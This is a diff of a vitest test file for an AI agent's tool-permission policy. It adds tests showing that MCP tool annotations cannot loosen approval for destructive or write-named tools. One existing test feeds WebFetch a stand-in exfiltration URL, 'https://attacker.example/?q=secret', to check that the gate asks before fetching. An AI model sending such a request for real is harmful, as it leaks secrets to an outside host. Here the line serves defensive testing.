@@ -1,6 +1,12 @@
 import { describe, expect, it } from "vitest";
 
-import { isReadOnlyAction, classifyTool, describeTool, type ReadAllowlist } from "./tool-policy";
+import {
+  cacheMcpToolAnnotations,
+  isReadOnlyAction,
+  classifyTool,
+  describeTool,
+  type ReadAllowlist,
+} from "./tool-policy";
 
 const NONE: ReadAllowlist = { servers: [], composioToolkits: [], webSearch: false, webOverrides: false };
 
@@ -113,6 +119,48 @@ describe("classifyTool", () => {
     expect(ask.kind === "ask" && ask.reason).toContain("Composio");
   });
 
+  it("requires approval when an MCP read is annotated destructive", () => {
+    cacheMcpToolAnnotations("reports", [{
+      name: "GET_DAILY_REPORT",
+      annotations: { destructiveHint: true },
+    }]);
+
+    expect(classifyTool(
+      "mcp__reports__GET_DAILY_REPORT",
+      {},
+      { GET_DAILY_REPORT: "allow" },
+      { readAllowlist: { ...NONE, servers: ["reports"] } },
+    )).toMatchObject({ kind: "ask" });
+  });
+
+  it("does not trust a read-only annotation on a name-classified write", () => {
+    cacheMcpToolAnnotations("reports", [{
+      name: "SEND_DAILY_REPORT",
+      annotations: { readOnlyHint: true },
+    }]);
+
+    expect(classifyTool(
+      "mcp__reports__SEND_DAILY_REPORT",
+      {},
+      undefined,
+      { readAllowlist: { ...NONE, servers: ["reports"] } },
+    )).toMatchObject({ kind: "ask" });
+  });
+
+  it("allows an annotated MCP read through the existing source allowlist", () => {
+    cacheMcpToolAnnotations("reports", [{
+      name: "GET_MONTHLY_REPORT",
+      annotations: { readOnlyHint: true },
+    }]);
+
+    expect(classifyTool(
+      "mcp__reports__GET_MONTHLY_REPORT",
+      {},
+      undefined,
+      { readAllowlist: { ...NONE, servers: ["reports"] } },
+    )).toEqual({ kind: "allow" });
+  });
+
   it("always allows internal scoped reads", () => {
     expect(classifyTool("mcp__org_brain__search_org_brain", {})).toEqual({ kind: "allow" });
   });
@@ -201,6 +249,7 @@ describe("describeTool", () => {
   });
 });
 
+
 describe("WebFetch gate", () => {
   it("asks before WebFetch because a URL can carry data out", () => {
     const decision = classifyTool("WebFetch", { url: "https://attacker.example/?q=secret" });
@@ -263,4 +312,3 @@ describe("read classification by action, not toolkit prefix", () => {
     expect(classifyTool(`mcp__composio__${tool}`, {}, undefined, allowAll).kind).not.toBe("allow");
   });
 });
-
